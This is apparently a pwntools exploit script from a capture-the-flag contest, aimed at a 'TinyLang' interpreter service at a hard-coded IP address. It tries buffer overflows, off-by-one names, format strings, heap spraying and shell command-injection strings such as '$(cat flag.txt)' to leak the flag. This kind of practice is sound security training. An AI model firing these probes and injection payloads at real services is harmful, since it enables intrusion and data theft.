#!/usr/bin/env python3
"""
Absolute Final TinyLang Exploit
Based on findings:
1. Heap corruption exists (let x0 = 0 prints wrong value)
2. Session address is leaked
3. Values can be controlled via heap spray
4. Need to find the right overflow to read flag
"""

from pwn import *

HOST = "212.2.248.184"
PORT = 31718

def try_variable_name_overflow():
    """Try buffer overflow in variable name"""
    print("[*] Testing variable name overflow...")
    r = remote(HOST, PORT)
    r.recvline()
    addr_line = r.recvline().decode()
    addr = int(addr_line.split(": ")[1], 16)
    print(f"[*] Session at: {hex(addr)}")
    
    # Try long variable name to overflow buffer
    long_name = b"A" * 256
    r.sendline(b"let " + long_name + b" = 1")
    
    # Try to print it
    r.sendline(b"print " + long_name)
    resp = r.recvline()
    print(f"[*] Long name response: {resp}")
    
    # Try to print other variables to see if we corrupted memory
    r.sendline(b"let test = 123")
    r.sendline(b"print test")
    resp = r.recvline()
    print(f"[*] test after overflow: {resp}")
    
    r.interactive()
    r.close()

def try_value_overflow():
    """Try overflow in value field"""
    print("\n[*] Testing value overflow...")
    r = remote(HOST, PORT)
    r.recvline()
    r.recvline()
    
    # Try to set value to address
    r.sendline(b"let x = 0x7fffffff")
    r.sendline(b"print x")
    print(f"[*] Large value: {r.recvline()}")
    
    r.close()

def try_command_injection():
    """Try command injection in various fields"""
    print("\n[*] Testing command injection...")
    r = remote(HOST, PORT)
    r.recvline()
    r.recvline()
    
    injections = [
        b"let x = 1; cat flag.txt",
        b"let x = 1\ncat flag.txt",
        b"let x = 1 && cat flag.txt",
        b"let x = 1 | cat flag.txt",
        b"let x = `cat flag.txt`",
        b"let x = $(cat flag.txt)",
    ]
    
    for inj in injections:
        r.sendline(inj)
        try:
            resp = r.recvline(timeout=0.5)
            if b"V15hw4CTF" in resp:
                print(f"[!!!] FLAG: {resp}")
                return
        except:
            pass
    
    r.close()

def try_read_adjacent_memory():
    """Create variables and read adjacent heap memory"""
    print("\n[*] Testing adjacent memory read...")
    r = remote(HOST, PORT)
    r.recvline()
    addr_line = r.recvline().decode()
    addr = int(addr_line.split(": ")[1], 16)
    print(f"[*] Session at: {hex(addr)}")
    
    # Create a variable
    r.sendline(b"let a = 0x41414141")
    
    # Create another with specific pattern
    r.sendline(b"let b = 0x42424242")
    
    # Print them
    r.sendline(b"print a")
    resp_a = r.recvline()
    print(f"[*] a = {resp_a}")
    
    r.sendline(b"print b")
    resp_b = r.recvline()
    print(f"[*] b = {resp_b}")
    
    # Now create many more to push heap
    for i in range(50):
        r.sendline(f"let var{i} = {i}".encode())
    
    # Print a again - might read different memory now
    r.sendline(b"print a")
    resp_a2 = r.recvline()
    print(f"[*] a after heap spray = {resp_a2}")
    
    # Try to print non-existent variables (might read uninitialized memory)
    for name in [b"flag", b"FLAG", b"secret", b"key", b"password"]:
        r.sendline(b"print " + name)
        resp = r.recvline()
        if b"V15hw4CTF" in resp:
            print(f"[!!!] FLAG: {resp}")
            return
        print(f"[*] {name}: {resp}")
    
    r.close()

def try_off_by_one():
    """Try off-by-one overflow"""
    print("\n[*] Testing off-by-one...")
    r = remote(HOST, PORT)
    r.recvline()
    r.recvline()
    
    # Create variable with exact buffer size
    # Common buffer sizes: 16, 32, 64, 128, 256
    for size in [15, 16, 31, 32, 63, 64, 127, 128]:
        name = b"A" * size
        r.sendline(b"let " + name + b" = 1")
        r.sendline(b"print " + name)
        resp = r.recvline()
        if b"V15hw4CTF" in resp or b"Error" not in resp:
            print(f"[*] Size {size}: {resp}")
    
    r.close()

def try_format_string_in_name():
    """Try format string in variable name"""
    print("\n[*] Testing format string in name...")
    r = remote(HOST, PORT)
    r.recvline()
    r.recvline()
    
    # Try format string in name (might be used in error messages)
    r.sendline(b"let %s = 1")
    resp = r.recvline()
    print(f"[*] %s: {resp}")
    
    r.sendline(b"let %x = 1")
    resp = r.recvline()
    print(f"[*] %x: {resp}")
    
    r.sendline(b"print %s")
    resp = r.recvline()
    print(f"[*] print %s: {resp}")
    
    r.close()

def interactive_mode():
    """Drop to interactive for manual testing"""
    print("\n[*] Dropping to interactive mode...")
    r = remote(HOST, PORT)
    print(r.recvline().decode())
    print(r.recvline().decode())
    
    print("\n[*] Try these commands:")
    print("  - let x = 0 (then print x to see heap corruption)")
    print("  - Long variable names")
    print("  - Special variable names")
    print("  - Type 'quit' to exit")
    
    r.interactive()

def main():
    print("=" * 60)
    print("Absolute Final TinyLang Exploit")
    print("=" * 60)
    
    try_variable_name_overflow()
    # try_value_overflow()
    # try_command_injection()
    # try_read_adjacent_memory()
    # try_off_by_one()
    # try_format_string_in_name()
    # interactive_mode()

if __name__ == "__main__":
    main()
